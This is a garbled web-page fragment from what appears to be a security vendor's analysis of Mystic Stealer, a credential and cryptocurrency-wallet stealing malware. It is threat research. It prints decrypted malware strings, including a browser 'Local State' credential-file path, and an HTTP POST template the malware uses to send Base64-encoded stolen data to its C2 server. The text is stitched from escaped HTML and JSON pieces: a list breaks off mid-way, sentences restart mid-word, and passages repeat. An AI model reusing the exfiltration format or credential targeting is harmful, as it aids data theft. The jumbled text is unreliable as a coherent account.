</div><div class="hidden"></div></div></div></div></div></div><div class="" id="conclusion"><div class=""><div class="wysiwyg_module_root__WLg4d container"><div class="default-grid"><div class="col-span-full lg:col-span-8 lg:col-start-4"><div class="wysiwyg_module_content__XGnZp"><h2 class="wysiwyg_module_h1__mOSH6"><span><span><span><span><span><span>Conclusion</span></span></span></span></span></span></h2>

<p><span><span><span><span><span><span>Even though Mystic Stealer is a relatively new information stealing malware, ThreatLabz has observed a significant increase in threat actors leveraging it to deploy additional malware. The developer behind Mystic Stealer is continuously modifying and improving the code, and the malware is quickly evolving. The C2 communication protocol used by Mystic Stealer has switched from a custom binary protocol to an HTTP-based protocol, likely to improve beaconing from infections in corporate environments that leverage firewalls to filter suspicious network traffic. Based on the number of new Mystic Stealer samples and C2 panels, the malware is likely to continue to pose a threat to organizations.</span></span></span></span></span></span></p>

<p><span><span><span><span><span><span>In addition to staying on top of these threats, Zscaler&#x27;s ThreatLabz team continuously monitors for new threats and shares its findings with the wider community.</span></span></span></span></span></span></p>

</div><div class="hidden"></div></div></div></div></div></div><div class="" id="appendix"><div class=""><div class="wysiwyg_module_root__WLg4d container"><div class="default-grid"><div class="col-span-full lg:col-span-8 lg:col-start-4"><div class="wysiwyg_module_content__XGnZp"><h2> </h2>

<h2>Appendix</h2>

<h3><span><span><span><span><span><span>Decrypted Malware Strings</span></span></span></span></span></span></h3>

<ul>
	<li><span><span><span><span><span><span>%08lX%04lX%lu</span></span></span></span></span></span></li>
	<li><span><span><span><span><span><span>%ix%i</span></span></span></span></span></span></li>
	<li><span><span><span><span><span><span>%ls %ls</span></span></span></span></span></span></li>
	<li><span><span><span><span><span><span>%ls [%ls %d] ERROR in %s, line %d, function %s. %s</span></span></span></span></span></span></li>
	<li><span><span><span><span><span><span>%ls\\%ls</span></span></span></span></span></span></li>
	<li><span><span><span><span><span><span>%ls\\%ls\\Local State</span></span></span></span></span></span></li>
	<li><span><span><span><span><span><span>%ls\\*</span></span></span></span></span></span></li>

Stealer is a relatively new downloader and information stealer that emerged in early 2023. The malware harvests data from a large number of web browsers and cryptocurrency wallet applications. Mystic can also be used to steal Steam game credentials and arbitrary files from an infected system. Mystic stands out for the level of obfuscation and improvements with each new version of the malware. The code continues to evolve and expand the data theft capabilities and the network communication was updated from a custom binary TCP-based protocol to an HTTP-based protocol. The shift to HTTP may be due to Mystic Stealer failing to beacon back to a C2 server in corporate environments, which frequently block network traffic on non-standard ports. The new modifications have led to increased popularity with criminal threat actors leveraging its loader functionality to distribute additional malware families including RedLine, DarkGate, and GCleaner.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eIn In recent versions, the application target list is now downloaded from the C2 server instead of being hardcoded, as we will examine in the following section.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\n"},"fieldSidebarNavigationTitle":null}]},{"__typename":"ParagraphBlogContainer","fieldSidebarNavigationTitle":"Communications","fieldReusableParagraphs":[{"__typename":"ParagraphWysiwygModule","fieldWysiwygModContent":{"__typename":"Text","value":"\u003ch2\u003eCommunications\u003c/h2\u003e\u003cp\u003e\u003cspan\u003eIn the latest Mystic Stealer variant, all communications between the infected system and the C2 server are performed using HTTP POST requests. Unlike the previous variant that used RC4 to encrypt a custom binary TCP-based protocol, the latest variant does not implement any form of encryption. The data sent in the POST query is Base64 encoded, as shown below:\u003c/span\u003e\u003c/p\u003e\u003cpre\u003e\u003ccode class=\"language-http\"\u003ePOST /loghub/master HTTP/1.1\r\nContent-Type: multipart/form-data; boundary=\u0026lt;boundary\u0026gt;\r\nContent-Length: NNN\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)\r\nHost: X.X.X.X\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\n\r\n--\u0026lt;boundary\u0026gt;\r\nContent-Disposition: form-data; name=\"\u0026lt;name\u0026gt;\"\r\n\r\n\r\nBASE64(\u0026lt;data\u0026gt;)\r\n--\u0026lt;boundary\u0026gt;\r\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cspan\u003eThe response data from the server is also encoded in Base64. The developer behind Mystic Stealer is continuously modifying and improving the code, and the malware is quickly evolving. The C2 communication protocol used by Mystic Stealer has switched from a custom binary protocol to an HTTP-based protocol, likely to improve beaconing from infections in corporate environments that leverage firewalls to filter suspicious network traffic. Based on the number of new Mystic Stealer samples and C2 panels, the malware is likely to continue to pose a threat to organizations.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\r\n\r\n\u003cp\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003e\u003cspan\u003eIn
